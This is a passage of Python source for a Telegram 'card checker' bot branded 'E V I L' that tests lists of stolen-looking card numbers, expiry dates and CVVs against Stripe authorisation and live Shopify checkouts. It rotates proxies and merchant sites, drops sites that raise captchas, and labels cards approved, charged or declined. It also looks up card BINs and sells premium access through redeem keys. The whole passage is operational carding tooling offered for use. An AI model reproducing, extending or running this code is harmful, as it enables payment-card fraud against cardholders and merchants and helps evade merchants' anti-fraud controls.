    if user_status == 'free':
        bot.reply_to(message, '''⛔ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
You are not authorized to use mass checking.
Contact admin for access key.

Owner: @Evilvx
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ E V I L ''')
        return
    
    # Check if user already has active mass check
    with active_checks_lock:
        if user_id in active_mass_checks:
            bot.reply_to(message, "⚠️ Please wait, you already have a checking session running. Please let it complete first.")
            return
    
    # Owner and Premium get proxy rotation and both Stripe+Shopify
    if user_status in ['owner', 'premium']:
        gate = 'sᴛʀɪᴘᴇ ᴀᴜᴛʜ + sʜᴏᴘɪғʏ (ᴘʀᴏxʏ)'
        ko = bot.reply_to(message, """━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━""").message_id
    else:
        gate = 'sᴛʀɪᴘᴇ ᴀᴜᴛʜ'
        ko = bot.reply_to(message, """━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━""").message_id
    
    cc_text = ""
    
    # Get card details from command or replied message text (no file support)
    is_from_file = False
    cc_text = message.reply_to_message.text if message.reply_to_message else message.text
    # Remove command (.mass /mass) 
    if cc_text.lower().startswith(('.mass', '/mass')):
        parts = cc_text.split(maxsplit=1)
        cc_text = parts[1] if len(parts) > 1 else ''
    
    # Split cards by lines
    cards = [card.strip() for card in cc_text.split('\n') if card.strip()]
    if not cards:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="<b>🚫 ɴᴏ ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\nᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴄᴀʀᴅs ʟɪɴᴇ ʙʏ ʟɪɴᴇ:\n\nXXXXXXXXXXXXXXXX|ᴍᴍ|ʏʏʏʏ|ᴄᴠᴠ\nXXXXXXXXXXXXXXXX|ᴍᴍ|ʏʏʏʏ|ᴄᴠᴠ</b>", parse_mode="HTML")
        return
    
    # Limit based on user status: owner/premium get 10, others get 20
    limit = 10 if user_status in ['owner', 'premium'] else 20
    
    # Check if user exceeds limit
    if len(cards) > limit:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''<b>⚠️ LIMIT EXCEEDED!</b>

Your Limit: {limit} cards
You Sent: {len(cards)} cards

/mass is limited to {limit} cards max''', parse_mode="HTML")
        return
    
    cards = cards[:limit]
    total_cards = len(cards)
    
    # Mark user as having active mass check (thread-safe)
    with active_checks_lock:
        active_mass_checks[user_id] = {
            'type': 'mass',
            'total': total_cards,
            'current': 0,
            'start_time': time.time()
        }
    
    # Clear any existing stop flags (thread-safe)
    with stop_flags_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]
    
    # Start background thread for mass checking
    thread = threading.Thread(
        target=run_mass_check_thread,
        args=(message, cards, ko, user_status, gate, is_from_file),
        daemon=True
    )
    thread.start()
    
    # Return immediately so bot stays responsive


def run_mass_check_thread(message, cards, ko, user_status, gate, is_from_file=False):
    """Run mass check in background thread"""
    user_id = str(message.from_user.id)
    total_cards = len(cards)
    
    # Set delay: 1 second for /mass command
    delay_seconds = 1
    
    results = []
    approved_cards = []
    declined_cards = []
    error_cards = []
    approved_count = 0
    dead_count = 0
    error_count = 0
    was_stopped = False  # Track if process was stopped by user
    
    for i, card in enumerate(cards, 1):
        # Check for stop flag (thread-safe)
        with stop_flags_lock:
            should_stop = user_id in stop_flags and stop_flags[user_id]
        
        if should_stop:
            # User wants to stop
            was_stopped = True
            bot.edit_message_text(
                chat_id=message.chat.id, 
                message_id=ko, 
                text=f"""🛑 <b>MASS CHECKING STOPPED!</b>

📊 <b>PARTIAL RESULTS:</b>
• Checked: {i-1}/{total_cards} cards
• ✅ Approved: {approved_count}
• ❌ Declined: {dead_count}
• ⚠️ Errors: {error_count}

<i>Process terminated by user.</i>""",
                parse_mode="HTML"
            )
            # Clean up (thread-safe)
            with active_checks_lock:
                if user_id in active_mass_checks:
                    del active_mass_checks[user_id]
            with stop_flags_lock:
                if user_id in stop_flags:
                    del stop_flags[user_id]
            return
        
        # Update progress (thread-safe)
        with active_checks_lock:
            if user_id in active_mass_checks:
                active_mass_checks[user_id]['current'] = i
        cc = str(reg(card))
        
        if cc == 'None':
            results.append({
                'cc': card,
                'status': '⚠️ Error',
                'response': 'Invalid card format',
                'brand': 'Unknown',
                'type': 'Unknown',
                'country': 'Unknown',
                'flag': '🏳️',
                'bank': 'Unknown',
                'time': '0.0s'
            })
            error_count += 1
            error_cards.append(f"∆ CARD ➜ {card}\n∆ STATUS ➜ ⚠️ Error: Invalid card format\nby E V I L ~\n")
        else:
            start_time = time.time()
            # Owner and Premium get proxy rotation + tries both Stripe and Shopify, others get regular Stripe
            if user_status in ['owner', 'premium']:
                stripe_result = brn6(cc, proxy=get_next_proxy(user_id=message.from_user.id))
                if stripe_result == 'Approved':
                    result = stripe_result
                else:
                    # Try Shopify if Stripe failed
                    shopify_site = get_next_site(message.from_user.id)
                    if shopify_site:
                        shopify_result = check_shopify(cc, shopify_site, proxy=get_next_proxy(user_id=message.from_user.id))
                        result = shopify_result['status'] if shopify_result['status'] == 'Approved' else stripe_result
                    else:
                        result = stripe_result
            else:
                # Regular users get Stripe checking without proxy rotation
                result = brn6(cc, proxy=None)
            end_time = time.time()
            
            try:
                data = requests.get('https://bins.antipublic.cc/bins/' + cc[:6]).json()
            except:
                data = {}
            
            brand = data.get('brand', 'Unknown')
            card_type = data.get('type', 'Unknown')
            country = data.get('country_name', 'Unknown')
            country_flag = data.get('country_flag', '🏳️')
            bank = data.get('bank', 'Unknown')
            
            # Categorize stripe response - check for success patterns (avoid false positives like "unsuccessful")
            result_lower = str(result).lower()
            # Check for negative patterns first (specific negative keywords)
            is_declined = any(word in result_lower for word in ['decline', 'insufficient', 'invalid', 'incorrect', 'reproved', 'reprovadas', 'unsuccessful', 'not successful', 'failed', 'error'])
            # Check for positive patterns (broader success patterns)
            is_approved = any(word in result_lower for word in ['success', 'charged', 'approved', 'aprovada', 'payment method added'])
            
            if is_approved and not is_declined:
                status = '✅ Approved'
                approved_count += 1
                # Keep original success message
                if len(str(result)) > 50:
                    result = 'Payment method added successfully'
            elif 'error' in result_lower or 'timeout' in result_lower:
                status = '⚠️ Error'
                error_count += 1
            else:
                status = '❌ Declined'
                dead_count += 1
                # Shorter response message for declines
                if len(str(result)) > 50:
                    result = 'Generic Decline'
            
            results.append({
                'cc': cc,
                'status': status,
                'response': result,
                'brand': brand,
                'type': card_type,
                'country': country,
                'flag': country_flag,
                'bank': bank,
                'time': f"{end_time - start_time:.1f}s"
            })
        
        # Build line-by-line output message
        progress_msg = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss sᴛʀɪᴘᴇ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>Mass Stripe Auth</b>
<b>Limit: {i}/{total_cards}</b>

"""
        
        # Add line-by-line results (show last 5)
        display_results = results[-5:] if len(results) > 5 else results
        for res in display_results:
            progress_msg += f"<b>CC :</b> {res['cc']}\n"
            progress_msg += f"<b>Status :</b> {res['status']}\n"
            progress_msg += f"<b>Response :</b> {html.escape(str(res['response']))}\n\n"
        
        # Add summary at the end
        progress_msg += f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
        
        if results:
            latest = results[-1]
            check_time = latest.get('time', '0.0s')
            progress_msg += f"<b>T/t:</b> {check_time} | <b>Proxy :</b> Live ☁️\n"
        
        user_name = message.from_user.first_name or "User"
        progress_msg += f"<b>User :</b>{user_name}"
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=progress_msg, parse_mode="HTML")
        
        # Add delay after each card check (except last one)
        if i < total_cards:
            time.sleep(delay_seconds)
    
    # Update statistics
    update_status(message.from_user.id, approved_count, total_cards)
    
    # Clean up active mass check tracking (no file sending)
    with active_checks_lock:
        if user_id in active_mass_checks:
            del active_mass_checks[user_id]
    with stop_flags_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]


def run_msh_thread(message, cards, total_cards, ko, user_status):
    """Background thread for mass shopify checking"""
    user_id = str(message.from_user.id)
    try:
        results = []
        approved_cards = []
        declined_cards = []
        error_cards = []
        approved_count = 0
        dead_count = 0
        error_count = 0
        was_stopped = False
        
        for i, card in enumerate(cards, 1):
            # Check for stop flag
            with stop_flags_lock:
                should_stop = stop_flags.get(user_id, False)
            
            if should_stop:
                # User wants to stop
                was_stopped = True
                bot.edit_message_text(
                    chat_id=message.chat.id, 
                    message_id=ko, 
                    text=f"""🛑 <b>MASS SHOPIFY CHECKING STOPPED!</b>

📊 <b>PARTIAL RESULTS:</b>
• Checked: {i-1}/{total_cards} cards
• ✅ Approved: {approved_count}
• ❌ Declined: {dead_count}
• ⚠️ Errors: {error_count}

<i>Process terminated by user.</i>""",
                    parse_mode="HTML"
                )
                # Clean up
                with active_checks_lock:
                    if user_id in active_mass_checks:
                        del active_mass_checks[user_id]
                with stop_flags_lock:
                    if user_id in stop_flags:
                        del stop_flags[user_id]
                return
            
            # Update progress
            with active_checks_lock:
                if user_id in active_mass_checks:
                    active_mass_checks[user_id]['current'] = i
            
            cc = str(reg(card))
            
            if cc == 'None':
                results.append({
                    'cc': card,
                    'status': '⚠️ Error',
                    'response': 'Invalid card format',
                    'gateway': 'Shopify',
                    'price': 'NA',
                    'brand': 'Unknown',
                    'type': 'Unknown',
                    'country': 'Unknown',
                    'flag': '🏳️',
                    'bank': 'Unknown',
                    'time': '0.0s'
                })
                error_count += 1
                error_cards.append(f"∆ CARD ➜ {card}\n∆ STATUS ➜ ⚠️ Error: Invalid card format\nby E V I L ~\n")
            else:
                start_time = time.time()
                
                # Get next site and proxy with user rotation
                shopify_site = get_next_site(message.from_user.id)
                proxy = get_next_proxy(user_id=message.from_user.id)
                
                if not shopify_site:
                    # Fallback if no sites available
                    result = {
                        'cc': cc,
                        'gateway': 'Shopify',
                        'price': 'NA',
                        'response': 'No Shopify sites available',
                        'status': 'Error'
                    }
                else:
                    # Check with Shopify
                    result = check_shopify(cc, shopify_site, proxy=proxy)
                    
                    # Check for hcaptcha and remove site if detected
                    response_lower = str(result['response']).lower()
                    if 'hcaptcha' in response_lower or 'captcha' in response_lower:
                        sites_data = load_sites()
                        user_sites = sites_data.get(user_id, [])
                        if shopify_site in user_sites:
                            user_sites.remove(shopify_site)
                            sites_data[user_id] = user_sites
                            save_sites(sites_data)
                            
                            global _user_cycles
                            if user_id in _user_cycles:
                                del _user_cycles[user_id]
                        
                        result['response'] = f"Captcha detected - Site removed: {shopify_site}"
                        result['status'] = 'Error'
                
                end_time = time.time()
                
                try:
                    data = requests.get('https://bins.antipublic.cc/bins/' + cc[:6]).json()
                except:
                    data = {}
                
                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '🏳️')
                bank = data.get('bank', 'Unknown')
                
                # Categorize Shopify response - shorter messages
                response_lower = str(result['response']).lower()
                if result['status'] == 'Approved':
                    status = '✅ Approved'
                    approved_count += 1
                    result['response'] = 'Payment method added successfully'
                elif result['status'] == 'Error':
                    status = '⚠️ Error'
                    error_count += 1
                else:
                    status = '❌ Declined'
                    dead_count += 1
                    result['response'] = 'Generic Decline'
                
                results.append({
                    'cc': cc,
                    'status': status,
                    'response': result['response'],
                    'gateway': result.get('gateway', 'Shopify'),
                    'price': result.get('price', 'NA'),
                    'brand': brand,
                    'type': card_type,
                    'country': country,
                    'flag': country_flag,
                    'bank': bank,
                    'time': f"{end_time - start_time:.1f}s"
                })
            
            # Build line-by-line output message
            latest_result = results[-1] if results else None
            price_display = latest_result.get('price', '0.98$') if latest_result else '0.98$'
            
            progress_msg = f"""━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss sʜᴏᴘɪғʏ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

<b>Mass Shopify {price_display}</b>
<b>Limit: {i}/{total_cards}</b>

"""
            
            # Add line-by-line results (show last 5)
            display_results = results[-5:] if len(results) > 5 else results
            for res in display_results:
                progress_msg += f"<b>CC :</b> {res['cc']}\n"
                progress_msg += f"<b>Status :</b> {res['status']}\n"
                progress_msg += f"<b>Response :</b> {html.escape(str(res['response']))}\n\n"
            
            # Add summary at the end
            progress_msg += f"━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━\n"
            
            if latest_result:
                check_time = latest_result.get('time', '0.0s')
                progress_msg += f"<b>T/t:</b> {check_time} | <b>Proxy :</b> Live ☁️\n"
            
            user_name = message.from_user.first_name or "User"
            progress_msg += f"<b>User :</b>{user_name}"
            
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=progress_msg, parse_mode="HTML")
            
            # Rate limiting: Owner gets faster speed
            if i < total_cards:
                delay = 1.5 if user_status == 'owner' else 3
                time.sleep(delay)
        
        # Update statistics
        update_status(message.from_user.id, approved_count, total_cards)
        
        # Clean up active mass check tracking (no file sending)
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
    
    except Exception as e:
        with active_checks_lock:
            if user_id in active_mass_checks:
                del active_mass_checks[user_id]
        with stop_flags_lock:
            if user_id in stop_flags:
                del stop_flags[user_id]
        
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error in mass check: {safe_error}")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.msh') or message.text.lower().startswith('/msh'))
def mass_shopify_check(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    user_status = get_user_status(message.from_user.id)
    user_id = str(message.from_user.id)
    
    # Block free users
    if user_status == 'free':
        bot.reply_to(message, '''⛔ 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
You are not authorized to use this bot.
Contact admin for access key.

Owner: @Evilvx
━ ━ ━ ━ ━ ━ ━ ━ ━ ━
𝐁𝐨𝐭 𝐁𝐲 ➜ E V I L ''')
        return
    
    # Check if user has added proxy and site
    user_proxies = get_user_proxy(user_id)
    user_sites = get_user_sites(user_id)
    
    if not user_proxies or not user_sites:
        msg = "❌ <b>Proxy and Site Required!</b>\n\n"
        if not user_proxies:
            msg += "⚠️ No proxy added! Use /setproxy to add\n"
        if not user_sites:
            msg += "⚠️ No site added! Use /addsite to add\n"
        bot.reply_to(message, msg, parse_mode='HTML')
        return
    
    # All non-free users get mass Shopify with proxy and site rotation
    gate = 'sʜᴏᴘɪғʏ (ᴘʀᴏxʏ + sɪᴛᴇ ʀᴏᴛᴀᴛɪᴏɴ)'
    ko = bot.reply_to(message, """━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
⚡ ᴍᴀss sʜᴏᴘɪғʏ ᴄʜᴇᴄᴋɪɴɢ
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━""").message_id
    
    cc_text = ""
    
    # Get card details from command or replied message text (no file support)
    cc_text = message.reply_to_message.text if message.reply_to_message else message.text
    # Remove command (.msh /msh) 
    if cc_text.lower().startswith(('.msh', '/msh')):
        parts = cc_text.split(maxsplit=1)
        cc_text = parts[1] if len(parts) > 1 else ''
    
    # Split cards by lines
    cards = [card.strip() for card in cc_text.split('\n') if card.strip()]
    if not cards:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="<b>🚫 ɴᴏ ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\nᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴄᴀʀᴅs ʟɪɴᴇ ʙʏ ʟɪɴᴇ:\n\nXXXXXXXXXXXXXXXX|ᴍᴍ|ʏʏʏʏ|ᴄᴠᴠ\nXXXXXXXXXXXXXXXX|ᴍᴍ|ʏʏʏʏ|ᴄᴠᴠ</b>", parse_mode="HTML")
        return
    
    # Limit for /msh command: owner=infinity, premium=50
    if user_status == 'owner':
        limit = float('inf')
    elif user_status == 'premium':
        limit = 50
    else:
        limit = 20
    
    # Check if user exceeds limit
    if limit != float('inf') and len(cards) > limit:
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f'''<b>⚠️ LIMIT EXCEEDED!</b>

Your Limit: {int(limit)} cards
You Sent: {len(cards)} cards

/msh is limited to {int(limit)} cards max''', parse_mode="HTML")
        return
    
    if limit != float('inf'):
        cards = cards[:int(limit)]
    total_cards = len(cards)
    
    # Mark user as having active mass check (thread-safe)
    user_id = str(message.from_user.id)
    with active_checks_lock:
        active_mass_checks[user_id] = {
            'type': 'msh',
            'total': total_cards,
            'current': 0,
            'start_time': time.time()
        }
    
    # Clear any existing stop flags (thread-safe)
    with stop_flags_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]
        stop_flags[user_id] = False
    
    # Spawn background thread for heavy work
    thread = threading.Thread(
        target=run_msh_thread,
        args=(message, cards, total_cards, ko, user_status),
        daemon=True
    )
    thread.start()


@bot.message_handler(func=lambda message: message.text.lower().startswith('.st') or message.text.lower().startswith('/st'))
def respond_to_vbv(message):
    try:
        # Check group authorization first
        if not check_group_authorization(message):
            return
        
        user_status = get_user_status(message.from_user.id)
        
        # Check cooldown for single check commands
        can_proceed, remaining = check_single_command_cooldown(message.from_user.id)
        if not can_proceed:
            bot.reply_to(message, f"⏳ Please wait {remaining} seconds before using another check command.")
            return
        
        # Get card details from command or replied message text
        cc_text = message.reply_to_message.text if message.reply_to_message else message.text
        # Remove command (.st /st)
        if cc_text.lower().startswith(('.st', '/st')):
            parts = cc_text.split(maxsplit=1)
            cc_text = parts[1] if len(parts) > 1 else ''

        cc = str(reg(cc_text))
        
        if cc == 'None':
            bot.reply_to(message, "<b>⚠️ Invalid card format!\nPlease provide card in format:\nXXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>", parse_mode="HTML")
            return

        ko = bot.reply_to(message, "■□□□□").message_id
        
        stop_animation = threading.Event()
        animation_thread = threading.Thread(
            target=animate_checking,
            args=(message.chat.id, ko, "STRIPE AUTH", stop_animation),
            daemon=True
        )
        animation_thread.start()
        
        start_time = time.time()
        
        # Use proxy rotation for /st command
        last = brn6(cc, proxy=get_next_proxy(user_id=message.from_user.id))
        
        stop_animation.set()
        animation_thread.join(timeout=1)
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # Get BIN information
        bin_data = get_bin_info(cc)
        
        # Get user info
        user_name = message.from_user.first_name or "Unknown"
        user_status = get_user_status(message.from_user.id)
        if user_status == 'owner':
            plan_display = 'OWNER 👑'
        elif user_status == 'premium':
            plan_display = 'VIP 🥇'
        else:
            plan_display = 'FREE'

        # Determine status and message based on response
        response_lower = str(last).lower()
        
        # Clean response - remove HTML tags
        import re as regex
        clean_response = regex.sub(r'<[^>]+>', '', str(last))
        
        # Check for negative patterns first (specific negative keywords)
        is_declined = any(word in response_lower for word in ['decline', 'insufficient', 'invalid', 'incorrect', 'reproved', 'reprovadas', 'unsuccessful', 'not successful', 'failed', 'error'])
        # Check for positive patterns (broader success patterns)
        is_approved = any(word in response_lower for word in ['success', 'charged', 'approved', 'aprovada', 'payment method added'])
        
        if is_approved and not is_declined:
            status_emoji = "✅"
            status_text = "APPROVED ✅"
            response_msg = "Payment method added successfully"
            approved_count = 1
        else:
            status_emoji = "❌"
            status_text = "DECLINED ❌"
            # Extract only the main decline reason
            if 'generic' in response_lower:
                response_msg = "Generic Decline"
            elif 'insufficient' in response_lower:
                response_msg = "Insufficient Funds"
            elif 'reproved' in response_lower or 'reprovadas' in response_lower:
                response_msg = "Card Declined"
            else:
                response_msg = clean_response[:50]  # First 50 chars only
            approved_count = 0
        
        # Professional formatted response like /pp
        msg = f"""<b>[#STRIPE AUTH] | Legend ◆</b>

<b>[•] Card-</b> <code>{html.escape(cc)}</code>
<b>[•] Gateway -</b> <code>Stripe Auth</code>
<b>[•] Status-</b> <code>{html.escape(status_text)}</code>
<b>[•] Response-</b> <code>{html.escape(response_msg)}</code>
______________________
<b>[+] Bin:</b> <code>{html.escape(bin_data['bin'])}</code>
<b>[+] Info:</b> <code>{html.escape(bin_data['info'])}</code>
<b>[+] Bank:</b> <code>{html.escape(bin_data['bank'])}</code> 🏛
<b>[+] Country:</b> <code>{html.escape(bin_data['country'])}</code> ━ [{bin_data['flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{html.escape(user_name)} [{plan_display}]</code>
<b>[ϟ] Dev ➜</b> <i><a href="tg://user?id={OWNER_ID}">E V I L ~</a></i>

<b>[ϟ] T/t:</b> [<code>{execution_time:.2f} s</code>]"""
        
        # Update statistics
        update_status(message.from_user.id, approved_count, 1)
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
        
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error checking card: {safe_error}")


# Shopify Single Check Command
@bot.message_handler(func=lambda message: message.text.lower().startswith('.sh') or message.text.lower().startswith('/sh'))
def shopify_single_check_cmd(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        user_status = get_user_status(message.from_user.id)
        
        # Check cooldown for single check commands
        can_proceed, remaining = check_single_command_cooldown(message.from_user.id)
        if not can_proceed:
            bot.reply_to(message, f"⏳ Please wait {remaining} seconds before using another check command.")
            return
        
        # Check if user has added proxy and site
        user_proxies = get_user_proxy(user_id)
        user_sites = get_user_sites(user_id)
        
        if not user_proxies or not user_sites:
            msg = "❌ <b>Proxy and Site Required!</b>\n\n"
            if not user_proxies:
                msg += "⚠️ No proxy added! Use /setproxy to add\n"
            if not user_sites:
                msg += "⚠️ No site added! Use /addsite to add\n"
            bot.reply_to(message, msg, parse_mode='HTML')
            return
        
        # Get card details from command or replied message text
        cc_text = message.reply_to_message.text if message.reply_to_message else message.text
        # Remove command (.sh /sh)
        if cc_text.lower().startswith(('.sh', '/sh')):
            parts = cc_text.split(maxsplit=1)
            cc_text = parts[1] if len(parts) > 1 else ''
        
        cc = str(reg(cc_text))
        
        if cc == 'None':
            bot.reply_to(message, "<b>⚠️ Invalid card format!\nPlease provide card in format:\nXXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>", parse_mode="HTML")
            return
        
        ko = bot.reply_to(message, "■□□□□").message_id
        
        stop_animation = threading.Event()
        animation_thread = threading.Thread(
            target=animate_checking,
            args=(message.chat.id, ko, "SHOPIFY", stop_animation),
            daemon=True
        )
        animation_thread.start()
        
        start_time = time.time()
        
        # Use site rotation for single check
        site = get_next_site(message.from_user.id)
        if not site:
            stop_animation.set()
            animation_thread.join(timeout=1)
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="❌ No sites available for checking!", parse_mode="HTML")
            return
        # Get user's proxy with rotation
        proxy = get_next_proxy(user_id=message.from_user.id)
        result = check_shopify(cc, site, proxy=proxy)
        
        stop_animation.set()
        animation_thread.join(timeout=1)
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # Categorize response like mass check
        response_lower = result['response'].lower()
        
        # Check for hcaptcha and remove site if detected
        if 'hcaptcha' in response_lower or 'captcha' in response_lower:
            sites_data = load_sites()
            user_sites = sites_data.get(user_id, [])
            if site in user_sites:
                user_sites.remove(site)
                sites_data[user_id] = user_sites
                save_sites(sites_data)
                
                global _user_cycles
                if user_id in _user_cycles:
                    del _user_cycles[user_id]
            
            stop_animation.set()
            animation_thread.join(timeout=1)
            bot.edit_message_text(
                chat_id=message.chat.id, 
                message_id=ko, 
                text=f"⚠️ <b>Captcha Detected!</b>\n\n🗑️ Site removed: <code>{site}</code>\n\nPlease try again with /sh", 
                parse_mode="HTML"
            )
            return
        
        # Get user info for the response
        user_name = message.from_user.first_name or "Unknown"
        user_status = get_user_status(message.from_user.id)
        
        # Determine status and format message using AutoShopify format
        if '3d' in response_lower or 'authentication' in response_lower:
            status_text = 'Approved ❎'
            approved_count = 1
        elif 'insufficient fund' in response_lower:
            status_text = 'Approved ❎'
            approved_count = 0
        elif any(x in response_lower for x in ['thank you', 'order success', 'charged', 'order placed', 'charge successful']):
            status_text = '💎 Charged'
            approved_count = 1
        elif any(x in response_lower for x in ['approved', 'payment_method_added', 'success']):
            status_text = '✅ Approved'
            approved_count = 1
        elif 'client token' in response_lower or result['gateway'] == 'NA' or 'token empty' in response_lower:
            status_text = '⚠️ Error'
            approved_count = 0
        else:
            status_text = '❌ Declined'
            approved_count = 0
        
        # Get proxy status
        proxy_status = "Live ⚡️" if proxy else "None"
        
        # Get BIN information
        bin_data = get_bin_info(result['cc'])
        
        # Format gateway to show "Shopify" with price
        if result['price'] != 'NA' and result['price']:
            gateway_text = f"Shopify {result['price']}"
        else:
            gateway_text = "Shopify"
        
        # Get user status for plan display
        user_status = get_user_status(message.from_user.id)
        if user_status == 'owner':
            plan_display = 'OWNER 👑'
        elif user_status == 'premium':
            plan_display = 'VIP 🥇'
        else:
            plan_display = 'FREE'
        
        # Format the AutoShopify response
        msg = f"""<b>[#AutoShopify] | Legend ◆</b>

<b>[•] Card-</b> <code>{html.escape(result['cc'])}</code>
<b>[•] Gateway -</b> <code>{html.escape(gateway_text)}</code>
<b>[•] Status-</b> <code>{html.escape(status_text)}</code>
<b>[•] Response-</b> <code>{html.escape(str(result['response']))}</code>
______________________
<b>[+] Bin:</b> <code>{html.escape(bin_data['bin'])}</code>
<b>[+] Info:</b> <code>{html.escape(bin_data['info'])}</code>
<b>[+] Bank:</b> <code>{html.escape(bin_data['bank'])}</code> 🏛
<b>[+] Country:</b> <code>{html.escape(bin_data['country'])}</code> ━ [{bin_data['flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{html.escape(user_name)} [{plan_display}]</code>
<b>[ϟ] Dev ➜</b> <i><a href="tg://user?id={OWNER_ID}">E V I L ~</a></i>

<b>[ϟ] T/t:</b> [<code>{'{:.2f}'.format(execution_time)} s</code>] |<b>P/x:</b> [<code>{html.escape(proxy_status)}</code>]"""
        
        # Update status
        update_status(message.from_user.id, approved_count, 1)
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML")
        
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error checking card: {safe_error}")

@bot.message_handler(commands=['ping'])
def ping_command(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    start_time = time.time()
    sent_msg = bot.reply_to(message, "🏓 Calculating ping...")
    end_time = time.time()
    
    ping_ms = round((end_time - start_time) * 1000, 2)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=sent_msg.message_id,
        text=f"🏓 Pong!\n⚡ Bot Ping: {ping_ms}ms\n🟢 Status: Online"
    )

@bot.message_handler(commands=['status'])
def show_status(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    status = load_staus()
    users = load_users()
    approved_cards = load_approved_cards()
    
    total_users = len(status['users_checked'])
    # Count only active premium users (not expired)
    active_premium = 0
    for user_data in users.values():
        if 'premium_until' in user_data:
            try:
                premium_until = datetime.fromisoformat(user_data['premium_until'])
                if datetime.now() < premium_until:
                    active_premium += 1
            except:
                pass
    
    # Get recent activity (last 24 hours)
    recent_approved = 0
    if approved_cards:
        yesterday = datetime.now() - timedelta(days=1)
        for card in approved_cards:
            try:
                card_time = datetime.fromisoformat(card['timestamp'])
                if card_time > yesterday:
                    recent_approved += 1
            except:
                pass
    
    msg = f"""📊 BOT STATISTICS

👥 Total Users: {total_users}
💎 Active Premium: {active_premium}
🔍 Total Checks: {status['total_checks']}
✅ Total Approved: {status['total_approved']}
📈 Success Rate: {round((status['total_approved']/status['total_checks']*100) if status['total_checks'] > 0 else 0, 2)}%
🔥 Approved (24h): {recent_approved}

🤖 Bot by <a href="tg://user?id={OWNER_ID}">E V I L ~</a>"""
    
    bot.reply_to(message, msg)

@bot.message_handler(commands=['key'])
def generate_key_command(message):
    """Generate redeem codes with time duration and quantity"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, """❌ Usage: /key <duration> <quantity>

<b>Examples:</b>
• /key 3hrs 4 - Generate 4 codes for 3 hours
• /key 1day 10 - Generate 10 codes for 1 day
• /key 30min 5 - Generate 5 codes for 30 minutes

<b>Supported units:</b> min, hrs, day""", parse_mode='HTML')
            return
        
        duration_str = parts[1].lower()
        quantity = int(parts[2])
        
        if quantity < 1 or quantity > 50:
            bot.reply_to(message, "❌ Quantity must be between 1-50")
            return
        
        # Parse duration
        import re
        match = re.match(r'(\d+)(min|hrs|day)', duration_str)
        if not match:
            bot.reply_to(message, "❌ Invalid duration format! Use: 30min, 3hrs, or 1day")
            return
        
        amount = int(match.group(1))
        unit = match.group(2)
        
        # Convert to minutes for storage
        if unit == 'min':
            total_minutes = amount
        elif unit == 'hrs':
            total_minutes = amount * 60
        elif unit == 'day':
            total_minutes = amount * 24 * 60
        
        # Generate codes
        codes = load_codes()
